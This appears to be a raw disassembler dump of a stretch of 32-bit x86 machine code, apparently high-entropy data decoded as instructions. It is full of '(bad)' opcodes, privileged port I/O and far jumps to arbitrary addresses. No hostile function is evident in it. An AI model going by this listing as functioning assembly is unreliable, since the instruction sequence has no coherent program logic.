  41ff5c:	mov    dl,0x10
  41ff5e:	push   cs
  41ff5f:	outs   dx,DWORD PTR ds:[esi]
  41ff60:	push   ebp
  41ff62:	(bad)  
  41ff63:	in     eax,0x4f
  41ff65:	or     al,al
  41ff67:	cmc    
  41ff68:	push   edx
  41ff69:	jp     0x41ff6f
  41ff6b:	imul   ebp,DWORD PTR [edx+0x3],0x10b27ac2
  41ff72:	nop
  41ff73:	out    0xf8,eax
  41ff75:	sub    al,0xee
  41ff77:	jo     0x41ffd0
  41ff79:	or     edx,DWORD PTR [ecx-0x67fb0231]
  41ff7f:	not    DWORD PTR ds:0x8cc39b86
  41ff85:	xchg   ebp,eax
  41ff86:	mov    ds:0x461fbce2,al
  41ff8b:	cmc    
  41ff8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff8d:	or     eax,ebp
  41ff8f:	rcr    esp,1
  41ff91:	daa    
  41ff92:	push   ebx
  41ff93:	add    ecx,edi
  41ff95:	jne    0x41ff7c
  41ff97:	std    
  41ff98:	mov    ebp,0x44121436
  41ff9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff9e:	inc    ecx
  41ff9f:	dec    ecx
  41ffa0:	jp     0x41ff2d
  41ffa2:	mov    edx,0x26d82b28
  41ffa7:	xor    BYTE PTR [edx-0x6c],cl
  41ffaa:	jmp    0x9e32c1bf
  41ffaf:	enter  0xf2e8,0xd2
  41ffb3:	data16 mov ds:0x36e9831a,al
  41ffb9:	xor    eax,0xdab29815
  41ffbe:	and    al,0x84
  41ffc0:	(bad)  
  41ffc1:	retf   
  41ffc2:	lahf   
  41ffc3:	cmp    al,0xb2
  41ffc5:	push   eax
  41ffc6:	xor    al,BYTE PTR [edi]
  41ffc8:	sub    edx,DWORD PTR [esi+0xba0dc6c]
  41ffce:	loop   0x42002f
  41ffd0:	mov    edx,0x96b8d313
  41ffd5:	cmp    ebx,DWORD PTR [edi-0x47611080]
  41ffdb:	xchg   edx,eax
  41ffdc:	xor    bh,BYTE PTR [esi]
  41ffde:	scas   al,BYTE PTR es:[edi]
  41ffdf:	push   ds
  41ffe0:	jecxz  0x41ffed
  41ffe2:	aaa    
  41ffe3:	lods   eax,DWORD PTR ds:[esi]
  41ffe4:	(bad)  
  41ffe5:	or     al,0x4d
  41ffe7:	aad    0x72
  41ffe9:	sbb    bl,BYTE PTR [edx+0x35d0b725]
  41ffef:	push   ss
  41fff0:	das    
  41fff1:	and    DWORD PTR [esi],0xffffffa7
  41fff4:	cdq    
  41fff5:	test   al,0x81
  41fff7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fff8:	jl     0x41ff8f
  41fffa:	jmp    0xd096:0x4566b2a1
  420001:	cs pop esi
  420003:	push   ecx
  420004:	inc    ecx
  420005:	add    al,0xf2
  420007:	add    cl,al
  420009:	xchg   esi,eax
  42000a:	mov    edx,0xc37a738d
  42000f:	push   0xbd0fafb2
  420014:	xchg   ebx,eax
  420015:	or     DWORD PTR [ecx+0x3d77ad5b],edi
  42001b:	sbb    DWORD PTR [eax+0x3c],0x7
  42001f:	lods   al,BYTE PTR ds:[esi]
  420020:	mov    eax,ds:0x4a6a1a3b
  420025:	pop    ss
  420026:	or     DWORD PTR [edx+esi*4-0x5b2ae066],edi
  42002d:	es in  al,dx
  42002f:	(bad)
  420032:	test   BYTE PTR [edi-0x2d6cb95d],ah
  420038:	imul   edx,ebp,0xb28b9d81
  42003e:	out    0x28,eax
  420040:	xor    ah,BYTE PTR [ebp-0x22d3b87b]
  420046:	scas   al,BYTE PTR es:[edi]
  420047:	(bad)  
  420048:	or     DWORD PTR [esi],edx
  42004a:	dec    edx
  42004b:	pop    edi
  42004c:	das    
  42004d:	dec    edi
  42004e:	(bad)
  420052:	mov    esp,0xaf08ceb7
  420057:	stos   DWORD PTR es:[edi],eax
  420058:	inc    edx
  420059:	retf   0x5e9a
  42005c:	aam    0x1f
  42005e:	xchg   bh,dh
  420060:	cdq    
  420061:	outs   dx,BYTE PTR ds:[esi]
  420062:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420063:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420064:	jnp    0x4200bc
  420066:	in     eax,0x77
  420068:	jmp    0x4e9b:0x8831a70f
  42006f:	daa    
  420070:	es iret 
  420072:	rcr    BYTE PTR [ebp-0x73],0xb4
  420076:	mul    BYTE PTR [edi+0x7f829559]
  42007c:	jns    0x420012
  42007e:	out    0x8e,eax
  420080:	mov    dl,0xdf
  420082:	jge    0x4200fd
  420084:	or     al,0x5
  420086:	mul    DWORD PTR [ecx-0x45]
  420089:	or     al,0x56
  42008b:	xchg   edi,eax
  42008c:	pop    ss
  42008d:	pop    ds
  42008e:	into   
  42008f:	js     0x420103
  420091:	pop    ss
  420092:	mov    al,0x72
  420094:	ins    DWORD PTR es:[edi],dx
  420095:	jmp    0x74668835
  42009a:	out    dx,al
  42009b:	into   
  42009c:	pop    edi
  42009d:	dec    esi
  42009e:	jbe    0x42007b
  4200a0:	push   ds
  4200a1:	or     ebx,DWORD PTR [esi-0x65]
  4200a4:	call   0x745fd877
  4200a9:	jae    0x420046
  4200ab:	inc    ebx
  4200ac:	pusha  
  4200ad:	cwde   
  4200ae:	jg     0x420126
  4200b0:	pushf  
  4200b1:	mov    ds:0x545a586b,eax
  4200b6:	pop    ss
  4200b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200b8:	jecxz  0x42005e
  4200ba:	sti    
  4200bb:	xor    edx,ebp
  4200bd:	shl    DWORD PTR [edx],1
  4200bf:	inc    edi
  4200c0:	jb     0x4200e2
  4200c2:	call   0xad82:0x7511fa19
  4200c9:	push   eax
  4200ca:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4200cc:	mov    BYTE PTR [eax+0x714e9b3a],bh
  4200d2:	inc    eax
  4200d3:	and    eax,0x9e1ab0b5
  4200d8:	cmp    DWORD PTR [esi+0x1a],edi
  4200db:	stc    
  4200dc:	jbe    0x42008b
  4200de:	out    0xa7,eax
  4200e0:	daa    
  4200e1:	fwait
  4200e2:	and    eax,0x3e25231e
  4200e7:	adc    eax,0xae68ccb2
  4200ec:	in     al,0xa6
  4200ee:	loopne 0x42016a
  4200f0:	out    0x50,eax
  4200f2:	test   eax,0x7d868827
  4200f7:	pop    eax
  4200f8:	mov    dl,0x88
  4200fa:	dec    esi
  4200fb:	dec    ebx
  4200fc:	add    eax,0x14667432
  420101:	add    al,0x96
  420103:	jno    0x42016a
  420105:	iret   
  420106:	jp     0x42011f
  420108:	mov    al,ds:0xb2940831
  42010d:	add    BYTE PTR [edi+esi*4],al
  420110:	adc    ah,bl
  420112:	idiv   esp
  420114:	fiadd  WORD PTR [ebx+ecx*4]
  420117:	fstp   TBYTE PTR [bx+si-0x46]
  42011b:	ss jmp 0x420169
  42011e:	aam    0x71
  420120:	mov    bl,0x22
  420122:	mov    ds:0x58795c0a,al
  420127:	das    
  420128:	xchg   edx,eax
  420129:	sub    DWORD PTR [esi],0xb5193ca7
  42012f:	jb     0x42012c
  420131:	push   cs
  420132:	loope  0x42013a
  420134:	mov    dl,0xf
  420136:	push   ds
  420137:	retf   
  420138:	sub    DWORD PTR [edx+0xbbfd670],edx
  42013e:	pop    ecx
  42013f:	add    al,0xdd
  420141:	inc    esp
  420142:	mov    ds:0x9db81a61,al
  420147:	push   esp
  420148:	and    BYTE PTR [ecx-0x2dd93d1c],dl
  42014e:	sbb    eax,0x92de3297
  420153:	(bad)  
  420154:	mov    cl,0xb
  420156:	push   0x618a7123
  42015b:	cmp    BYTE PTR [esi-0x69],bh
  42015e:	mov    ds:0xf48b3759,eax
  420163:	call   FWORD PTR [ecx+0x41]
  420166:	sbb    ch,dh
  420168:	test   al,ch
  42016a:	outs   dx,BYTE PTR ds:[esi]
  42016b:	xchg   ebp,eax
  42016c:	inc    eax
  42016d:	jnp    0x4201e6
  42016f:	addr16 push esi
  420171:	push   cs
  420172:	std    
  420173:	pop    esi
  420174:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420175:	bound  ebx,QWORD PTR [edx-0x72815e14]
  42017b:	inc    esp
  42017c:	inc    esi
  42017d:	mov    eax,0x7f094ff9
  420182:	das    
  420183:	lahf   
  420184:	xor    al,0xf1
  420186:	sbb    dl,bl
  420188:	fnstenv [ebp+0x777ac3ed]
  42018e:	call   0x5e0d:0xe97e3809
  420195:	adc    eax,0xeea29c2d
  42019a:	sbb    dh,BYTE PTR [edi+ebx*2]
  42019d:	inc    eax
  42019e:	push   cs
  42019f:	punpckhbw mm3,QWORD PTR [ebx-0x66]
  4201a3:	in     eax,0xf7
  4201a5:	dec    edi
  4201a6:	cmp    ebp,0xffffffc8
  4201a9:	mov    ah,0x5c
  4201ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201ac:	js     0x4201f0
  4201ae:	sbb    BYTE PTR [esp+eax*8-0x1d7f040],al
  4201b5:	lods   eax,DWORD PTR ds:[esi]
  4201b6:	mov    edx,0x885933a7
  4201bb:	and    DWORD PTR [eax],ebx
  4201bd:	out    dx,eax
  4201be:	sbb    eax,0x10497d6
  4201c3:	fwait
  4201c4:	mov    BYTE PTR [ebx-0x3a],cl
  4201c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201c8:	mov    ah,0x5e
  4201ca:	loop   0x42019e
  4201cc:	mov    dh,0xa7
  4201ce:	call   0xda56:0x77e2ecf8
  4201d5:	mov    ds:0x620fa706,al
  4201da:	scas   eax,DWORD PTR es:[edi]
  4201db:	inc    ebp
  4201dc:	xor    eax,DWORD PTR [edx]
  4201de:	and    eax,0x92d58808
  4201e3:	cmp    ebx,DWORD PTR [ecx]
  4201e5:	xchg   edx,eax
  4201e6:	(bad)  
  4201e8:	inc    eax
  4201e9:	add    eax,0xbdef5a8
  4201ee:	push   esp
  4201ef:	add    eax,0x323d4e55
  4201f4:	dec    esp
  4201f5:	daa    
  4201f6:	fwait
  4201f7:	sub    ch,BYTE PTR [edi-0x4a]
  4201fa:	sti    
  4201fb:	dec    esp
  4201fc:	mov    es,WORD PTR [esi+0x66]
  4201ff:	adc    edi,DWORD PTR [ecx]
  420201:	or     edx,DWORD PTR [esi+0x653e868]
  420207:	fadd   st(0),st
  420209:	pop    ss
  42020a:	call   0x541d:0x72b376e9
  420211:	and    dh,BYTE PTR [ecx-0x59]
  420214:	pop    ds
  420215:	imul   ecx,ecx,0x26c93bc2
  42021b:	add    eax,0x5bc232b2
  420220:	mov    ah,0xd7
  420222:	ins    DWORD PTR es:[edi],dx
  420223:	inc    esp
  420224:	xor    ecx,DWORD PTR [ebx]
  420226:	call   0x3806ffd8
  42022b:	lahf   
  42022c:	sar    BYTE PTR [ebx],cl
  42022e:	call   0x3e32:0x5b72c812
  420235:	mov    ds:0x2e0fa766,al
  42023a:	ss mov bh,0x5c
  42023e:	push   ebp
  42023f:	dec    edx
  420240:	dec    eax
  420241:	popa   
  420242:	mov    ds:0x3b0b184f,al
  420247:	and    al,0x6c
  420249:	faddp  st(0),st
  42024b:	js     0x420284
  42024d:	or     edx,DWORD PTR [esi-0x379ccf94]
  420253:	xchg   ecx,eax
  420254:	xor    edi,DWORD PTR [edx]
  420256:	call   0xa26e:0x1345bb0d
  42025d:	sub    al,0x11
  42025f:	(bad)
  420263:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420264:	adc    dh,BYTE PTR [esi+0x3f]
  420267:	xchg   bl,dh
  420269:	jae    0x4202b2
  42026b:	(bad)  
  42026c:	mov    ecx,ecx
  42026e:	out    dx,eax
  42026f:	daa    
  420270:	cmp    al,0xe2
  420272:	and    DWORD PTR [edi+eiz*2-0x66519a64],edi
  420279:	mov    bh,0x3a
  42027b:	mov    edx,0x7a940bc7
  420280:	or     cl,ch
  420282:	mov    eax,0x29731ca7
  420287:	sti    
  420288:	mov    DWORD PTR [ecx-0xc],edx
  42028b:	mov    ?,WORD PTR [ebp-0x2dbe49df]
  420291:	repz mov edx,0x83f6c0da
  420297:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420298:	dec    esp
  420299:	adc    DWORD PTR [ebx-0x561b2c24],0x36
  4202a0:	mov    dl,0x99
  4202a2:	mov    ebx,0xd343c227
  4202a7:	enter  0x786,0x46
  4202ab:	push   ss
  4202ac:	test   BYTE PTR [ecx+0x3a],cl
  4202af:	adc    bh,BYTE PTR [ecx-0x2b534749]
  4202b5:	or     dl,BYTE PTR [edx+0x11]
  4202b8:	push   0xffffff8c
  4202ba:	fidivr DWORD PTR [ecx+0x12]
  4202bd:	mov    ebx,0x5ac7bab5
  4202c2:	inc    ecx
  4202c3:	daa    
  4202c4:	hlt    
  4202c5:	test   eax,0xdab08c47
  4202ca:	call   0x8285:0x2878430b
  4202d1:	mov    edx,0xa54496d
  4202d6:	test   BYTE PTR [ecx+ecx*1],cl
  4202d9:	cmp    al,dl
  4202db:	fs adc al,0xe3
  4202de:	(bad)  
  4202df:	mov    dl,0xc4
  4202e1:	shl    DWORD PTR [ebx+eiz*8-0x2afa74a1],0xcb
  4202e9:	push   edi
  4202ea:	pop    es
  4202eb:	jo     0x42030d
  4202ed:	add    eax,0xa61e25a1
  4202f2:	(bad)  [edx-0x6]
  4202f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4202f7:	jg     0x420365
  4202f9:	call   0xe757:0x4d5e3c95
  420300:	cdq    
  420301:	stos   BYTE PTR es:[edi],al
  420302:	push   esp
  420303:	sbb    al,0xd5
  420305:	and    eax,0x19e4760a
  42030a:	imul   ebp,DWORD PTR [ecx-0x34853eb6],0x19
  420311:	jl     0x420368
  420313:	add    DWORD PTR [esi-0x3928d62c],esi
  420319:	scas   al,BYTE PTR es:[edi]
  42031a:	pop    edx
  42031b:	(bad)  
  42031c:	aad    0xfe
  42031e:	loop   0x4202c7
  420320:	les    esi,FWORD PTR [ecx-0x6a708fd1]
  420326:	rep lods al,BYTE PTR gs:[esi]
  420329:	in     eax,dx
  42032a:	or     ebx,DWORD PTR [ecx-0xb]
  42032d:	mov    ds:0xcee26773,eax
  420332:	jnp    0x4202e9
  420334:	stc    
  420335:	xor    bh,cl
  420337:	sahf   
  420338:	mov    esi,0x348fa53d
  42033d:	aad    0xe5
  42033f:	xor    BYTE PTR [edx-0x21b03553],0x2e
  420346:	push   edi
  420347:	or     DWORD PTR [edx],esp
  420349:	or     ebp,ecx
  42034b:	popf   
  42034c:	jmp    0xfa498a7a
  420351:	dec    edx
  420352:	call   0xc723:0x1d0de8ea
  420359:	arpl   WORD PTR [ecx+0x7bc929a8],sp
  42035f:	mov    al,0x55
  420361:	mov    esi,0x60240724
  420366:	lmsw   WORD PTR [edx-0x5761d97]
  42036d:	sub    eax,0x16659a4f
  420372:	jno    0x420301
  420374:	jecxz  0x42030a
  420376:	or     ah,bh
  420378:	pop    ebx
  420379:	cmp    BYTE PTR [edi-0x79e5d426],dh
  42037f:	jmp    FWORD PTR [edi+0x35f44577]
  420385:	sbb    DWORD PTR [ecx-0x5a2dcde5],ecx
  42038b:	cmp    DWORD PTR [si+0x27],edi
  42038f:	pop    ebp
  420390:	xchg   ebx,eax
  420391:	or     esp,DWORD PTR [eax+0x1b9c51cd]
  420397:	jp     0x42039e
  420399:	(bad)  
  42039a:	call   0x2ea3:0x544048ab
  4203a1:	dec    ebx
  4203a2:	pop    ss
  4203a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203a4:	daa    
  4203a5:	fld    QWORD PTR [edx]
  4203a7:	xor    DWORD PTR ds:0xb5ee4714,ebp
  4203ad:	push   edi
  4203ae:	adc    BYTE PTR [ecx],0xab
  4203b1:	or     edx,DWORD PTR ss:[esi+0x79ba8ebe]
  4203b8:	pop    ds
  4203b9:	add    al,0xdd
  4203bb:	aas    
  4203bc:	loopne 0x42036e
  4203be:	cmp    ah,bl
  4203c0:	icebp  
  4203c1:	and    edi,DWORD PTR [edx]
  4203c3:	xor    DWORD PTR [edx+0x158bc2d5],0xed98307b
  4203cd:	or     edx,esi
  4203cf:	std    
  4203d0:	inc    ecx
  4203d1:	test   eax,0xcf7477cf
  4203d6:	call   0xd3e7:0x55bcd214
  4203dd:	inc    esp
  4203de:	sbb    al,0xb9
  4203e0:	sti    
  4203e1:	test   DWORD PTR [eax],eax
  4203e3:	addr16 in al,0x50
  4203e6:	(bad)  
  4203e7:	out    dx,eax
  4203e8:	sub    edx,esi
  4203ea:	xchg   DWORD PTR [edx],eax
  4203ec:	mov    ebx,0x2c905a29
  4203f1:	sub    bh,cl
  4203f3:	push   edx
  4203f4:	mov    al,0xb
  4203f6:	fst    DWORD PTR [ebp-0x8]
  4203f9:	div    DWORD PTR [ebx-0xd]
  4203fc:	pop    ecx
  4203fd:	mov    dh,0x9a
  4203ff:	push   cs
  420400:	dec    edi
  420401:	cmpps  xmm2,XMMWORD PTR [eax],0xce
  420405:	fisttp QWORD PTR [eax+0x44bd09a6]
  42040b:	test   BYTE PTR [eax-0x6f38e96a],bl
  420411:	cmp    bl,BYTE PTR [edx-0x62203579]
  420417:	stc    
  420418:	mov    bh,0x46
  42041a:	out    dx,eax
  42041b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42041c:	sub    eax,DWORD PTR [eax-0x43c44267]
  420422:	mov    WORD PTR [eax-0x3b438853],?
  420428:	jb     0x4203f8
  42042a:	pusha  
  42042b:	aas    
  42042c:	mov    fs,WORD PTR [ebp-0x68ba6064]
  420432:	call   0x36e:0x94ddaaf6
  420439:	test   BYTE PTR [ebp-0x5f4e96b],ah
  42043f:	not    DWORD PTR [esi+eiz*8+0x6d]
  420443:	or     eax,0xf0ec0ac7
  420448:	mov    ds:0xfc19a246,al
  42044d:	cmp    ebx,eax
  42044f:	jb     0x420403
  420451:	lahf   
  420452:	scas   eax,DWORD PTR es:[edi]
  420453:	shl    BYTE PTR [ebx-0x7642300e],1
  420459:	or     esp,eax
  42045b:	cmp    BYTE PTR [ecx+0x1bf93a80],al
  420461:	mov    ds,WORD PTR [edx+0x77acaf8b]
  420467:	div    DWORD PTR [esi]
  420469:	adc    al,0x5d
  42046b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42046c:	mov    al,ds:0x4aede993
  420471:	xor    eax,0x90b2e0f5
  420476:	dec    edx
  420477:	mov    al,0x93
  420479:	rcl    edi,0x44
  42047c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42047d:	or     edx,DWORD PTR [ebx-0x32]
  420480:	inc    ebp
  420481:	sbb    edx,DWORD PTR [esi+ebp*1]
  420484:	xor    eax,0xb1617ec4
  420489:	aad    0x3
  42048b:	test   eax,0xa71c8024
  420490:	out    dx,al
  420491:	xor    edi,DWORD PTR [eax-0x1d29491c]
  420497:	xchg   BYTE PTR [edx+0x232a7b7d],dh
  42049d:	arpl   WORD PTR es:[ebx+ebx*8+0xb],dx
  4204a2:	les    eax,FWORD PTR [ecx]
  4204a4:	xor    ah,bh
  4204a6:	aad    0x4e
  4204a8:	inc    ebp
  4204a9:	and    dl,BYTE PTR [ebp-0x43e5f309]
  4204af:	pop    es
  4204b0:	push   ecx
  4204b1:	dec    edx
  4204b2:	pop    esi
  4204b3:	mov    al,0x6c
  4204b5:	or     BYTE PTR [ebp-0x4b],ah
  4204b8:	stos   DWORD PTR es:[edi],eax
  4204b9:	or     ch,0x20
  4204bc:	sbb    cl,cl
  4204be:	jae    0x42045b
  4204c0:	mov    dl,0x2d
  4204c2:	or     ebx,ebp
  4204c4:	xor    ecx,DWORD PTR [ebp+0x6c]
  4204c7:	add    edx,DWORD PTR [ebx+ecx*1]
  4204ca:	or     eax,0x8ba8f45
  4204cf:	es out dx,ax
  4204d2:	popf   
  4204d3:	aas    
  4204d4:	pop    esi
  4204d5:	stos   BYTE PTR es:[edi],al
  4204d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4204d7:	pop    edi
  4204d8:	ret    0x99f7
  4204db:	xor    BYTE PTR [eax+0x41c96f0b],al
  4204e1:	push   eax
  4204e2:	inc    esi
  4204e3:	and    al,0x5f
  4204e5:	pop    ds
  4204e6:	call   0xb3e6:0xee933656
  4204ed:	in     eax,dx
  4204ee:	sub    BYTE PTR [edi+0x6c8bae1e],ah
  4204f4:	lods   eax,DWORD PTR ds:[esi]
  4204f5:	jae    0x420509
  4204f7:	sbb    eax,0xcc9a8b56
  4204fc:	scas   eax,DWORD PTR es:[edi]
  4204fd:	call   0xa4d7:0x242c8388
  420504:	pusha  
  420505:	push   0x1a81ca7f
  42050a:	dec    edx
  42050b:	and    DWORD PTR ds:0xa9b89a86,edx
  420511:	scas   al,BYTE PTR es:[edi]
  420512:	pop    ebp
  420513:	fs cmc 
  420515:	mov    esi,0xbe6d027
  42051a:	and    bh,cl
  42051c:	enter  0xc5bb,0x45
  420520:	or     DWORD PTR ds:0x1e7be39a,esp
  420526:	bound  ebp,QWORD PTR [edi+edi*2]
  420529:	mov    bh,0xb0
  42052b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42052c:	pop    esp
  42052d:	retf   
  42052e:	pop    edi
  42052f:	sub    ah,BYTE PTR [ecx]
  420531:	es pushf 
  420533:	pop    ecx
  420534:	(bad)  
  420535:	jle    0x4204d4
  420537:	sbb    esi,ecx
  420539:	mov    ss,WORD PTR ds:0x994d92c0
  42053f:	inc    edx
  420540:	add    ecx,DWORD PTR [ebx]
  420542:	push   edi
  420543:	adc    eax,0x1f666ea6
  420548:	push   ss
  420549:	xlat   BYTE PTR ds:[ebx]
  42054a:	jmp    0x1b05:0xc0e1b24b
  420551:	nop
  420552:	push   ds
  420553:	pop    ebp
  420554:	or     esi,DWORD PTR gs:[edi]
  420557:	or     BYTE PTR [edi+0x13ff559d],bh
  42055d:	int    0x95
  42055f:	cs int3 
  420561:	fstp   TBYTE PTR [ebp-0x4d7264f9]
  420567:	cwde   
  420568:	xor    edx,DWORD PTR ds:0xba43482
  42056e:	xor    eax,0x390aa635
  420573:	push   0x4bb0e3b2
  420578:	or     dl,ah
  42057a:	pop    ecx
  42057b:	fsubr  QWORD PTR [ebx+ecx*1]
  42057e:	cli    
  42057f:	cmp    al,0x24
  420581:	push   edi
  420582:	inc    edi
  420583:	aam    0x1f
  420585:	inc    ecx
  420586:	call   0xb279bb10
  42058b:	call   0x231c1619
  420590:	mov    eax,ds:0x6aa78458
  420595:	shl    BYTE PTR [ebx-0x3899fa90],cl
  42059b:	leave  
  42059c:	sub    cl,BYTE PTR [edi-0x66]
  42059f:	popa   
  4205a0:	ret    
  4205a1:	or     ecx,edi
  4205a3:	sub    al,0xa1
  4205a5:	clc    
  4205a6:	test   BYTE PTR [edx+0x27bdec87],bh
  4205ac:	mov    ds:0x1e94ef63,eax
  4205b1:	jae    0x42054d
  4205b3:	pop    esi
  4205b4:	outs   dx,DWORD PTR ds:[esi]
  4205b5:	jecxz  0x4205f9
  4205b7:	adc    dh,BYTE PTR [eax]
  4205b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205ba:	retf   
  4205bb:	aam    0xf3
  4205bd:	or     ch,BYTE PTR [eax-0x3a]
  4205c0:	scas   eax,DWORD PTR es:[edi]
  4205c1:	sub    DWORD PTR [eax],esi
  4205c3:	jo     0x4205c0
  4205c5:	test   BYTE PTR [ecx-0x657e7029],0x72
  4205cc:	xchg   ebx,eax
  4205cd:	lds    edx,FWORD PTR [ecx-0x77]
  4205d0:	ja     0x4205c9
  4205d2:	sbb    bh,BYTE PTR [edi+0x45cfe23d]
  4205d8:	inc    ebp
  4205d9:	out    0x9a,al
  4205db:	jmp    0xea42c98
  4205e0:	imul   edi,DWORD PTR [ebx],0x54
  4205e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205e4:	pop    ecx
  4205e5:	xchg   esp,eax
  4205e6:	das    
  4205e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205e8:	sub    DWORD PTR [ecx+0x7f9c95fd],0xfffffff5
  4205ef:	cmp    dh,BYTE PTR [edx-0x6e94d541]
  4205f5:	push   eax
  4205f6:	or     esp,DWORD PTR [ebx+0x3d66123a]
  4205fc:	cmp    al,0x8b
  4205fe:	(bad)  
  4205ff:	push   ss
  420600:	mov    ah,0xf6
  420602:	pop    ecx
  420603:	jno    0x4205d9
  420605:	shl    ch,0xf
  420608:	add    eax,0x5da6366e
  42060d:	add    DWORD PTR [ebp+0x6e],edi
  420610:	jno    0x4205a1
  420612:	add    al,0x5a
  420614:	imul   esi,edi,0xb2cc05f1
  42061a:	call   0x861d:0x9432f9b4
  420621:	in     al,dx
  420622:	or     ah,BYTE PTR [edi+0x4e12ccba]
  420628:	fs pop ds
  42062a:	sub    eax,0x87744e01
  42062f:	mov    dh,0x47
  420631:	sbb    edx,ebx
  420633:	and    edx,DWORD PTR ds:0xec82832d
  420639:	or     edx,DWORD PTR [esi+0x1c378153]
  42063f:	dec    eax
  420640:	fwait
  420641:	jnp    0x4205dc
  420643:	mov    ebx,0xb7aef885
  420648:	xor    eax,0xdfd01bfb
  42064d:	jns    0x42063b
  42064f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420650:	ret    
  420651:	inc    esp
  420652:	push   ecx
  420653:	sbb    al,0x6f
  420655:	and    al,0x2e
  420657:	inc    ecx
  420658:	mov    dl,0x80
  42065a:	aaa    
  42065b:	pushf  
  42065c:	pop    ebp
  42065d:	add    BYTE PTR [ecx],bl
  42065f:	sub    edi,ecx
  420661:	xchg   ebx,eax
  420662:	and    eax,0x5f6bafa7
  420667:	outs   dx,DWORD PTR ds:[esi]
  420668:	fwait
  420669:	pop    eax
  42066a:	jge    0x420601
  42066c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42066d:	jecxz  0x420655
  42066f:	(bad)  
  420670:	mov    dl,0xa8
  420672:	cs dec ebp
  420674:	popa   
  420675:	sar    esi,0xdd
  420678:	jmp    0xeb89:0x137a930b
  42067f:	(bad)  
  420680:	(bad)  ds:0xc9d50d84
  420686:	call   0xdd34:0xb044e848
  42068d:	or     ch,BYTE PTR [ebp-0x2c55a9e9]
  420693:	inc    ecx
  420694:	test   bl,ah
  420696:	jo     0x420692
  420698:	mov    dl,0x4b
  42069a:	and    esi,edi
  42069c:	outs   dx,DWORD PTR ds:[esi]
  42069d:	repz cs push esp
  4206a0:	cmp    al,0xb
  4206a2:	call   0x43318ef5
  4206a7:	jge    0x4206a8
  4206a9:	inc    edi
  4206aa:	call   0x92a4:0x3d5aed95
  4206b1:	rol    BYTE PTR ds:0xbe47a7,1
  4206b7:	shr    DWORD PTR [ebp+0x1b],1
  4206ba:	dec    edi
  4206bb:	ret    0xe8b2
  4206be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4206bf:	gs fucomip st,st(2)
  4206c2:	cmp    cl,0x3e
  4206c5:	or     edi,DWORD PTR [ebp+ecx*8-0x40d07f45]
  4206cc:	es pop ecx
  4206ce:	call   0xfed7:0xfbffaee8
  4206d5:	cmp    eax,0x1c3bdf20
  4206da:	dec    eax
  4206db:	outs   dx,DWORD PTR ds:[esi]
  4206dc:	loop   0x4206e9
  4206de:	fnstcw WORD PTR [ebx+eax*1+0x2247a8ac]
  4206e5:	pop    DWORD PTR [edx]
  4206e7:	dec    edi
  4206e8:	mov    ch,0xdf
  4206ea:	stc    
  4206eb:	fnsave [eax+edi*8+0x142a83f6]
  4206f2:	push   ss
  4206f3:	out    0xcc,al
  4206f5:	dec    edx
  4206f6:	mov    ebp,0x80f33131
  4206fb:	imul   esp,DWORD PTR [ebx+0x0],0xffffff9a
  4206ff:	data16 jb 0x4206a7
  420702:	push   es
  420703:	lahf   
  420704:	addr16 in al,0x0
  420707:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420708:	call   ecx
  42070a:	inc    edx
  42070b:	out    dx,al
  42070c:	ss push ebx
  42070e:	xchg   esi,eax
  42070f:	inc    edi
  420710:	jge    0x420764
  420712:	call   0xc28:0x501be79e
  420719:	adc    eax,0x87dea79f
  42071e:	jae    0x42077b
  420720:	jb     0x42071e
  420722:	aad    0xf9
  420724:	mov    dl,0xf5
  420726:	dec    edi
  420727:	stos   DWORD PTR es:[edi],eax
  420728:	pop    esi
  420729:	imul   ecx,DWORD PTR [ecx+0x42],0x69
  42072d:	repz mov dl,0xa8
  420730:	sbb    eax,0xb268dd96
  420735:	in     al,dx
  420736:	inc    eax
  420737:	popf   
  420738:	or     al,0x30
  42073a:	jecxz  0x42071d
  42073c:	xchg   esi,eax
  42073d:	xchg   edx,eax
  42073e:	and    eax,0x8be5b106
  420743:	and    eax,0x525aacb5
  420748:	sbb    eax,0x26a9b67f
  42074d:	adc    DWORD PTR [edi],eax
  42074f:	rcl    DWORD PTR [edx-0x5e],0x11
  420753:	sbb    BYTE PTR [edi+0x5],0x9a
  420757:	loope  0x4207ce
  420759:	aam    0x23
  42075b:	push   0xfffffff3
  42075d:	imul   DWORD PTR [eax-0x59]
  420760:	cmp    DWORD PTR [ebx-0x3f610c],0x6ab22ef9
  42076a:	inc    edx
  42076b:	adc    BYTE PTR [ebp+0x2cd6b2df],bh
  420771:	or     esi,DWORD PTR [eax]
  420773:	push   edx
  420774:	retf   
  420775:	push   cs
  420776:	push   edi
  420777:	out    dx,eax
  420778:	jmp    0x9249:0xd3cd9f3a
  42077f:	lahf   
  420780:	jb     0x420703
  420782:	int3   
  420783:	and    al,0x18
  420785:	or     dl,ch
  420787:	push   edx
  420788:	aaa    
  420789:	or     dh,BYTE PTR [ecx]
  42078b:	cmp    dl,BYTE PTR [edx+0x35]
